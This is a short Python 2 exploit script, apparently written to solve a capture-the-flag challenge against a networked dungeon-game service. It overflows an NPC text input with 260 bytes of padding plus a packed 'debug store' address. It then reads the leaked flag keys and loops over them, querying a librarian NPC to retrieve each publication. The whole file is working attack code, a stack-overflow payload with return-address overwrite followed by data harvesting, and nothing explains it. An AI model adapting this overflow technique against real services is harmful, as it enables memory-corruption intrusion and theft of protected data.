import gameapy
import struct
import os, re
import rpgaddr

HOST = "localhost"
#HOST = "10.12.0.3"
PORT = 8080

DEBUG_STORE_ADDR = rpgaddr.symdebugStoreAddr
libPubPosRe = re.compile("Meticulous Librarian: Here is your\npublication:\n(\S+)")


g = gameapy.DungeonSession(300,300)
g.connectTo(HOST,PORT)

g.navigateToNPC("P")
g.readNPCText()
g.enterNPCText("A"*256 + "AAAA" + struct.pack("<I", DEBUG_STORE_ADDR))
print("Flag keys are:")
res =  g.con.read_until("\x1b",2).strip()
print res

print "Keys are:"
for key in res.split(" "):
	g.navigateToNPC("L")
	g.readNPCText()
	g.choiceNPCMCOption(1)
	g.enterNPCText(key)
	result = g.readNPCText()
	m = libPubPosRe.search(result)
	if m:
		res = m.group(1)
		print("{} -> {}".format(key,res))
	else:
		print("{} -> unable to fetch".format(key))
print("==DONE==")
g.quit()
